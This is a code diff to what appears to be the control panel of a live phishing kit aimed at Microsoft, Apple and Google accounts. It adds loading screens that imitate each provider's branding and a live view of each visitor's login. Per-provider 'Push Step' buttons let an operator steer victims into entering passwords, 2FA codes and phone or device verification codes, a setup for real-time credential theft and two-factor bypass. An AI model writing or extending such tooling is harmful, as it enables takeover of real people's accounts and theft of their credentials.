@@ -76,6 +76,9 @@ const STEP_LABELS: Record<string, string> = {
   stay: 'Stay Signed In',
   register: 'Register',
   recover: 'Recover',
+  'device-trust': 'Device Trust',
+  'verification-code': 'Verify Code',
+  'phone-verify': 'Phone Verify',
 };
 
 const STEP_COLORS: Record<string, string> = {
@@ -89,6 +92,9 @@ const STEP_COLORS: Record<string, string> = {
   stay: '#15803d',
   register: '#be185d',
   recover: '#9f1239',
+  'device-trust': '#1d4ed8',
+  'verification-code': '#6d28d9',
+  'phone-verify': '#065f46',
 };
 
 const FIELD_LABELS: Record<string, string> = {
@@ -97,6 +103,28 @@ const FIELD_LABELS: Record<string, string> = {
   email_code: 'Email Code',
   phone: 'Phone Number',
   phone_code: 'Phone Code',
+  verification_code: '2FA Code',
+};
+
+const PROVIDER_PUSH_STEPS: Record<string, { label: string; step: string; color: string }[]> = {
+  microsoft: [
+    { label: '↩ Email',     step: 'email',           color: '#4b5563' },
+    { label: 'Password',    step: 'password',         color: '#0078D4' },
+    { label: 'Code',        step: 'email-code',       color: '#7c3aed' },
+    { label: 'Other ways',  step: 'other-ways',       color: '#047857' },
+  ],
+  apple: [
+    { label: '↩ Email',     step: 'email',            color: '#4b5563' },
+    { label: 'Password',    step: 'password',          color: '#007AFF' },
+    { label: 'Device',      step: 'device-trust',      color: '#1d4ed8' },
+    { label: 'Verify Code', step: 'verification-code', color: '#6d28d9' },
+  ],
+  google: [
+    { label: '↩ Email',     step: 'email',            color: '#4b5563' },
+    { label: 'Password',    step: 'password',          color: '#4285F4' },
+    { label: 'Phone Verify',step: 'phone-verify',      color: '#065f46' },
+    { label: 'Phone Code',  step: 'phone-code',        color: '#b45309' },
+  ],
 };
 
 function ProviderBadge({ provider, size = 14 }: { provider: string; size?: number }) {
@@ -197,12 +225,57 @@ function VisitorModal({
           {/* Login iframe */}
           <div className="flex-1 bg-[#0b0c10] relative overflow-hidden">
             {!iframeLoaded && (
-              <div className="absolute inset-0 flex flex-col items-center justify-center gap-4 z-10 bg-[#0b0c10]">
-                <Loader2 className="w-8 h-8 text-[#3a3f4a] animate-spin" />
-                <div className="text-center">
-                  <p className="text-[14px] text-[#8a919e] font-medium">Loading live view…</p>
-                  <p className="text-[11px] text-[#555d6b] mt-1">This may take a moment, hang tight</p>
-                </div>
+              <div className="absolute inset-0 z-10 overflow-hidden">
+                {visitor.provider === 'microsoft' && (
+                  <div className="w-full h-full flex items-center justify-center bg-white" style={{ fontFamily: 'system-ui, Segoe UI, sans-serif' }}>
+                    <div className="flex flex-col items-center px-10 pt-10 pb-12 shadow-md bg-white w-[380px]">
+                      <div className="flex items-center gap-2 mb-8">
+                        <MicrosoftLogoLg />
+                        <span className="text-[15px] font-semibold tracking-wide text-[#737373]">Microsoft</span>
+                      </div>
+                      <div className="flex gap-2">
+                        {[0,1,2].map(i => <div key={i} className="w-2.5 h-2.5 rounded-full bg-[#0078D4] animate-bounce" style={{ animationDelay: `${i*0.15}s` }} />)}
+                      </div>
+                    </div>
+                  </div>
+                )}
+                {visitor.provider === 'apple' && (
+                  <div className="w-full h-full flex items-center justify-center bg-[#f5f5f7]">
+                    <div className="flex flex-col items-center py-14 px-12 rounded-2xl shadow-xl bg-white">
+                      <AppleLogo className="w-12 h-12 text-black mb-5" />
+                      <svg className="w-8 h-8" viewBox="0 0 50 50">
+                        <circle cx="25" cy="25" r="20" fill="none" strokeWidth="3" strokeLinecap="round"
+                          stroke="#1c1c1e" strokeDasharray="70 130" strokeOpacity="0.6"
+                          className="animate-spin" style={{ animationDuration: '0.9s' }} />
+                      </svg>
+                    </div>
+                  </div>
+                )}
+                {visitor.provider === 'google' && (
+                  <div className="w-full h-full flex items-center justify-center bg-[#f0f4f9]">
+                    <div className="flex flex-col items-center p-10 rounded-3xl shadow-xl bg-white gap-6">
+                      <GoogleLogo size={32} />
+                      <svg className="w-9 h-9 animate-spin" viewBox="0 0 50 50" style={{ animationDuration: '1s' }}>
+                        <defs>
+                          <linearGradient id="goog-load" x1="0%" y1="0%" x2="100%" y2="0%">
+                            <stop offset="0%" stopColor="#4285F4"/>
+                            <stop offset="33%" stopColor="#EA4335"/>
+                            <stop offset="66%" stopColor="#FBBC05"/>
+                            <stop offset="100%" stopColor="#34A853"/>
+                          </linearGradient>
+                        </defs>
+                        <circle cx="25" cy="25" r="20" fill="none" strokeWidth="4" strokeLinecap="round"
+                          stroke="url(#goog-load)" strokeDasharray="80 126" />
+                      </svg>
+                    </div>
+                  </div>
+                )}
+                {!['microsoft','apple','google'].includes(visitor.provider) && (
+                  <div className="w-full h-full flex flex-col items-center justify-center gap-4 bg-[#0b0c10]">
+                    <Loader2 className="w-8 h-8 text-[#3a3f4a] animate-spin" />
+                    <p className="text-[14px] text-[#8a919e] font-medium">Loading live view…</p>
+                  </div>
+                )}
               </div>
             )}
             <iframe
@@ -224,12 +297,11 @@ function VisitorModal({
 
             {/* Push actions */}
             <div className="p-4 border-b border-[#2d3139]">
-              <p className="text-[10px] font-bold uppercase tracking-widest text-[#8a919e] mb-3">Push Action</p>
+              <p className="text-[10px] font-bold uppercase tracking-widest text-[#8a919e] mb-2.5">Push Step</p>
               <div className="grid grid-cols-2 gap-1.5">
-                <ActionBtn fullWidth label="↩ Email"    color="#4b5563"  onClick={() => onPushAction(visitor.id, 'email')} />
-                <ActionBtn fullWidth label="Password"   color="#0078D4"  onClick={() => onPushAction(visitor.id, 'password')} />
-                <ActionBtn fullWidth label="Code"       color="#7c3aed"  onClick={() => onPushAction(visitor.id, 'email-code')} />
-                <ActionBtn fullWidth label="Other ways" color="#047857"  onClick={() => onPushAction(visitor.id, 'other-ways')} />
+                {(PROVIDER_PUSH_STEPS[visitor.provider] ?? PROVIDER_PUSH_STEPS.microsoft).map(({ label, step, color }) => (
+                  <ActionBtn key={step} fullWidth label={label} color={color} onClick={() => onPushAction(visitor.id, step)} />
+                ))}
               </div>
             </div>
 
